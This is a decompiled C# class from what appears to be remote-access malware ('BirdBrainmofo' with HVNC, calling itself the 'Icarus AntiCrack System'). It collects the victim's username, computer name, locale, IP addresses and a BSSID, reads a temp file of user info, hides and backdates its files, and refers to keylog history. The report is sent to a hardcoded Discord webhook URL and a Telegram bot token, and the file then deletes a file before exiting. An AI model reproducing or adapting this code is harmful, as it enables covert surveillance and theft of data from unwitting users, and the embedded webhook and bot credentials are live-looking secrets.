using System;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using BirdBrainmofo.HVNC;
using BirdBrainmofo.HVNC.Helpers;
using Newtonsoft.Json.Linq;
using Telegram.Bot;
using Telegram.Bot.Types;
using File = System.IO.File;

namespace BirdBrainmofo
{
	// Token: 0x02000037 RID: 55
	internal sealed class DiscordWebHook
	{
		// Token: 0x060001F8 RID: 504 RVA: 0x00010B80 File Offset: 0x0000ED80
		public static void SetLatestMessageId(string string_0)
		{
			try
			{
				File.WriteAllText(LatestMessageIdLocation, string_0);
				Startup.SetFileCreationDate(LatestMessageIdLocation);
				Startup.HideFile(LatestMessageIdLocation);
			}
			catch (Exception)
			{
				Logging.Log();
			}
		}

		// Token: 0x060001F9 RID: 505 RVA: 0x00010BCC File Offset: 0x0000EDCC
		public static string GetLatestMessageId()
		{
			return File.Exists(LatestMessageIdLocation) ? File.ReadAllText(LatestMessageIdLocation) : "-1";
		}

		// Token: 0x060001FA RID: 506 RVA: 0x00010BF8 File Offset: 0x0000EDF8
		private static string GetMessageId(string response)
		{
			JObject jobject = JObject.Parse(response);
			return jobject["id"].Value<string>();
		}

		// Token: 0x060001FB RID: 507 RVA: 0x00010C20 File Offset: 0x0000EE20
		public static bool WebhookIsValid(string hook)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					string text = webClient.DownloadString(hook);
					return text.StartsWith("{\"type\": 1");
				}
			}
			catch (Exception)
			{
				Logging.Log();
			}
			return false;
		}

		// Token: 0x060001FC RID: 508 RVA: 0x00010C80 File Offset: 0x0000EE80
		internal static void SendReportT(string tool)
		{
			string text = "5652875771:AAEqS1pFcXmYREkRahghnmYF3oemBuEt9V8";
			string text2 = "5559416008";
			string text3 = Path.Combine(Path.GetTempPath(), "userinfo.txt");
			string text4 = File.ReadLines(text3).First();
			string text5 = string.Concat("\n\ud83d\udc80 *Icarus AntiCrack System - Report:*\nDate: ", SystemInfo.Datenow, "\nSystem: ", "Windows 11 Pro (64 Bit)", "\nUsername: ", SystemInfo.Username, "\nCompName: ", SystemInfo.Compname, "\nLanguage: ", Flags.GetFlag(SystemInfo.Culture.Split('-')[1]), " ", SystemInfo.Culture, "\nAntivirus: ", "Windows Defender.", "\n\n\ud83d\udce1 *Network:* \nGateway IP: ", "192.168.0.1", "\nInternal IP: ", "192.168.0.12", "\nExternal IP: ", "24.135.106.160", "\n", "BSSID: 98:9d:5d:bc:e5:d8", "\n\nSuspicius User -->", text4, "\nTools Detected: ", tool, "\nBan Reason: ", tool);
			try
			{
				using (defender defender = new defender())
				{
					ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						managementObject["Caption"].ToString();
						defender.ProfilePicture = "https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png";
						defender.UserName = "ICARUS";
						if (File.Exists(text3))
						{
							sendMessage(text, text2, text5 + Environment.NewLine);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001FD RID: 509 RVA: 0x00010E98 File Offset: 0x0000F098
		internal static void SendReport(string tool)
		{
			string text = "https://discord.com/api/webhooks/1014922643390083133/Ix87W1-9_SpBknLkk7WcJLAfKdSOzRN0Lelk1ADNc2eGEvepYwCGpjPDDBurWDyL50uB";
			string text2 = Path.Combine(Path.GetTempPath(), "userinfo.txt");
			string text3 = File.ReadLines(text2).First();
			string text4 = string.Concat("```\n\ud83d\udc80 *Icarus AntiCrack System - Report:*\nDate: ", SystemInfo.Datenow, "\nSystem: ", "Windows 11 Pro (64 Bit)", "\nUsername: ", SystemInfo.Username, "\nCompName: ", SystemInfo.Compname, "\nLanguage: ", Flags.GetFlag(SystemInfo.Culture.Split('-')[1]), " ", SystemInfo.Culture, "\nAntivirus: ", "Windows Defender.", "\n\n\ud83d\udce1 *Network:* \nGateway IP: ", "192.168.0.1", "\nInternal IP: ", "192.168.0.12", "\nExternal IP: ", "24.135.106.160", "\n", "BSSID: 98:9d:5d:bc:e5:d8", "\n\nSuspicius User -->", text3, "\nTools Detected: ", tool, "\nBan Reason: ", tool, "```");
			string text5 = "-1";
			if (text5 != "-1")
			{
				EditMessage(text4, text5, text);
			}
			else
			{
				SetLatestMessageId(SendMessage(text4, text));
			}
			try
			{
				using (defender defender = new defender())
				{
					ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						managementObject["Caption"].ToString();
						defender.ProfilePicture = "https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png";
						defender.UserName = "ICARUS";
						defender.WebHook = text;
						if (File.Exists(text2))
						{
							defender.SendMessage("```" + text4 + Environment.NewLine + "```");
						}
						else
						{
							defender.SendMessage("```" + text4 + Environment.NewLine + "```");
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001FE RID: 510 RVA: 0x0001111C File Offset: 0x0000F31C
		public static string SendMessage(string text, string hook)
		{
			try
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				using (WebClient webClient = new WebClient())
				{
					nameValueCollection.Add("username", "Icarus");
					nameValueCollection.Add("avatar_url", "https://i.ibb.co/kDLd65M/dcicon.png");
					nameValueCollection.Add("content", text);
					byte[] array = webClient.UploadValues(hook + "?wait=true", nameValueCollection);
					return GetMessageId(Encoding.UTF8.GetString(array));
				}
			}
			catch (Exception)
			{
				Logging.Log();
			}
			return "0";
		}

		// Token: 0x060001FF RID: 511 RVA: 0x000111C0 File Offset: 0x0000F3C0
		public static void EditMessage(string text, string string_0, string hook)
		{
			try
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				using (WebClient webClient = new WebClient())
				{
					nameValueCollection.Add("username", "Icarus");
					nameValueCollection.Add("avatar_url", "https://i.ibb.co/kDLd65M/dcicon.png");
					nameValueCollection.Add("content", text);
					webClient.UploadValues(hook + "/messages/" + string_0, "PATCH", nameValueCollection);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000200 RID: 512 RVA: 0x0001124C File Offset: 0x0000F44C
		public static string Unfo()
		{
			string text = Path.Combine(Path.GetTempPath(), "userinfo.txt");
			using (StreamReader streamReader = File.OpenText(text))
			{
				DiscordWebHook.text = streamReader.ReadToEnd();
				Console.WriteLine(DiscordWebHook.text);
			}
			return DiscordWebHook.text;
		}

		// Token: 0x06000201 RID: 513 RVA: 0x000112A8 File Offset: 0x0000F4A8
		public static Task sendMessage(string token, string destID, string text)
        {
            return null;
        }

		// Token: 0x06000202 RID: 514 RVA: 0x00007567 File Offset: 0x00005767
		internal static void Finish(string file)
		{
			Path.GetTempPath();
			Thread.Sleep(15000);
			File.Delete(file);
			Environment.Exit(0);
		}



		// Token: 0x06000204 RID: 516 RVA: 0x00007585 File Offset: 0x00005785
		// Note: this type is marked as 'beforefieldinit'.
		static DiscordWebHook()
		{
		}

		// Token: 0x04000164 RID: 356
		private const int MaxKeylogs = 10;

		// Token: 0x04000165 RID: 357
		private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

		// Token: 0x04000166 RID: 358
		private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

		// Token: 0x04000167 RID: 359
		public static string text;

		// Token: 0x04000168 RID: 360
		public string user;

		// Token: 0x02000038 RID: 56
		[CompilerGenerated]
		private sealed class sendMessage_14 : IAsyncStateMachine
		{
			// Token: 0x06000205 RID: 517 RVA: 0x00006F52 File Offset: 0x00005152

            // Token: 0x06000206 RID: 518 RVA: 0x000112FC File Offset: 0x0000F4FC
			void IAsyncStateMachine.MoveNext()
			{
				
			}

			// Token: 0x06000207 RID: 519 RVA: 0x000063EF File Offset: 0x000045EF
			void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
			{
			}

			// Token: 0x04000169 RID: 361
			public int _state;

			// Token: 0x0400016A RID: 362
			public AsyncTaskMethodBuilder _builder;

			// Token: 0x0400016B RID: 363
			public string token;

			// Token: 0x0400016C RID: 364
			public string destID;

			// Token: 0x0400016D RID: 365
			public string text;

			// Token: 0x0400016E RID: 366
			private TelegramBotClient bot_1;

			// Token: 0x0400016F RID: 367
			private Exception e_2;

			// Token: 0x04000170 RID: 368
			private TaskAwaiter<Message> u_1;
		}
	}
}
